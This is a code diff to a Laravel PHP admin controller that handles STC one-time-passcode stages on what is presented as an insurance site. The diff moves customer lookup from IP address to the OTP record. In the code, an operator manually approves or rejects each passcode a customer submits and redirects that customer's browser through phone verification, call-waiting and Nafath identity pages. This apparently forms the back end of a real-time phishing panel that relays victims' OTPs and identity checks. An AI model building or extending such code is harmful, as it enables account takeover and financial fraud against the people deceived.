@@ -12,7 +12,6 @@ use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
 use App\Http\Controllers\Controller;
 use App\Http\Requests\Admin\AdminOtpActionRequest;
 use App\Http\Requests\Admin\AdminOtpRejectRequest;
-use App\Models\CustomerProfile;
 use App\Models\OtpCode;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Support\Facades\Log;
@@ -24,9 +23,8 @@ class AdminStcController extends Controller
     /**
      * Merge an STC flag into the customer's extra_data and update current_page.
      */
-    private function setStcFlag(string $customerIp, string $flag, string $currentPage, ?string $reason = null): void
+    private function setStcFlag(?\App\Models\CustomerProfile $customer, string $flag, string $currentPage, ?string $reason = null): void
     {
-        $customer = CustomerProfile::where('ip_address', $customerIp)->first();
         if ($customer) {
             $extra = $customer->extra_data ?? [];
             $extra[$flag] = true;
@@ -40,9 +38,13 @@ class AdminStcController extends Controller
     /**
      * Shared approve logic for all 3 STC stages.
      */
-    private function approveStage(AdminOtpActionRequest $request, object $event, string $flag, string $redirectPage, string $rebroadcastMsg, string $successMsg): JsonResponse
+    private function approveStage(AdminOtpActionRequest $request, string $eventClass, ?string $eventRedirect, string $flag, string $redirectPage, string $rebroadcastMsg, string $successMsg): JsonResponse
     {
         $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();
+        $customer = $otp->customer;
+        $customerIp = $customer?->ip_address ?? $request->customer_ip;
+        $sessionId = $otp->session_id ?: $customer?->session_id;
+        $event = new $eventClass($sessionId, $eventRedirect, $customer?->id);
 
         if ($otp->status !== 'pending') {
             if (in_array($otp->status, ['approved', 'verified'])) {
@@ -51,10 +53,10 @@ class AdminStcController extends Controller
                 } catch (\Throwable $e) {
                     Log::warning("Broadcast failed (re-broadcast {$flag}): " . $e->getMessage());
                 }
-                $this->setStcFlag($request->customer_ip, $flag, $redirectPage);
+                $this->setStcFlag($customer, $flag, $redirectPage);
                 $this->flushCustomerCache();
-                $this->notifyDashboard($request->customer_ip, $flag);
-                $this->refreshPaymentViewed($request->customer_ip);
+                $this->notifyDashboard($customer ?? $customerIp, $flag);
+                $this->refreshPaymentViewed($customer ?? $customerIp);
                 return response()->json(['success' => true, 'message' => $rebroadcastMsg]);
             }
             return response()->json([
@@ -71,10 +73,10 @@ class AdminStcController extends Controller
             Log::warning("Broadcast failed ({$flag}): " . $e->getMessage());
         }
 
-        $this->setStcFlag($request->customer_ip, $flag, $redirectPage);
+        $this->setStcFlag($customer, $flag, $redirectPage);
         $this->flushCustomerCache();
-        $this->notifyDashboard($request->customer_ip, $flag);
-        $this->refreshPaymentViewed($request->customer_ip);
+        $this->notifyDashboard($customer ?? $customerIp, $flag);
+        $this->refreshPaymentViewed($customer ?? $customerIp);
 
         return response()->json(['success' => true, 'message' => $successMsg]);
     }
@@ -82,9 +84,13 @@ class AdminStcController extends Controller
     /**
      * Shared reject logic for all 3 STC stages.
      */
-    private function rejectStage(AdminOtpRejectRequest $request, object $event, string $flag, string $successMsg): JsonResponse
+    private function rejectStage(AdminOtpRejectRequest $request, string $eventClass, string $flag, string $successMsg): JsonResponse
     {
         $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();
+        $customer = $otp->customer;
+        $customerIp = $customer?->ip_address ?? $request->customer_ip;
+        $sessionId = $otp->session_id ?: $customer?->session_id;
+        $event = new $eventClass($sessionId, $request->input('reason'), $customer?->id);
 
         if ($otp->status !== 'pending') {
             return response()->json([
@@ -101,10 +107,10 @@ class AdminStcController extends Controller
             Log::warning("Broadcast failed ({$flag}): " . $e->getMessage());
         }
 
-        $this->setStcFlag($request->customer_ip, $flag, '/insurance/phone-verification', $request->input('reason'));
+        $this->setStcFlag($customer, $flag, '/insurance/phone-verification', $request->input('reason'));
         $this->flushCustomerCache();
-        $this->notifyDashboard($request->customer_ip, $flag);
-        $this->refreshPaymentViewed($request->customer_ip);
+        $this->notifyDashboard($customer ?? $customerIp, $flag);
+        $this->refreshPaymentViewed($customer ?? $customerIp);
 
         return response()->json(['success' => true, 'message' => $successMsg]);
     }
@@ -115,7 +121,8 @@ class AdminStcController extends Controller
     {
         return $this->approveStage(
             $request,
-            new StcWaitingApproved($request->customer_ip),
+            StcWaitingApproved::class,
+            null,
             'stc_waiting_approved',
             '/insurance/stc/otp',
             'تمت إعادة إرسال الموافقة على انتظار STC',
@@ -127,7 +134,7 @@ class AdminStcController extends Controller
     {
         return $this->rejectStage(
             $request,
-            new StcWaitingRejected($request->customer_ip, $request->input('reason')),
+            StcWaitingRejected::class,
             'stc_waiting_rejected',
             'تم رفض طلب التحقق STC',
         );
@@ -139,7 +146,8 @@ class AdminStcController extends Controller
     {
         return $this->approveStage(
             $request,
-            new StcOtpApproved($request->customer_ip),
+            StcOtpApproved::class,
+            null,
             'stc_otp_approved',
             '/insurance/stc/call-waiting',
             'تمت إعادة إرسال الموافقة على رمز التحقق STC',
@@ -151,7 +159,7 @@ class AdminStcController extends Controller
     {
         return $this->rejectStage(
             $request,
-            new StcOtpRejected($request->customer_ip, $request->input('reason')),
+            StcOtpRejected::class,
             'stc_otp_rejected',
             'تم رفض رمز التحقق STC',
         );
@@ -163,7 +171,8 @@ class AdminStcController extends Controller
     {
         return $this->approveStage(
             $request,
-            new StcCallApproved($request->customer_ip, '/insurance/nafath'),
+            StcCallApproved::class,
+            '/insurance/nafath',
             'stc_call_approved',
             '/insurance/nafath',
             'تمت إعادة إرسال الموافقة على مكالمة STC',
@@ -175,7 +184,7 @@ class AdminStcController extends Controller
     {
         return $this->rejectStage(
             $request,
-            new StcCallRejected($request->customer_ip, $request->input('reason')),
+            StcCallRejected::class,
             'stc_call_rejected',
             'تم رفض مكالمة التحقق STC',
         );
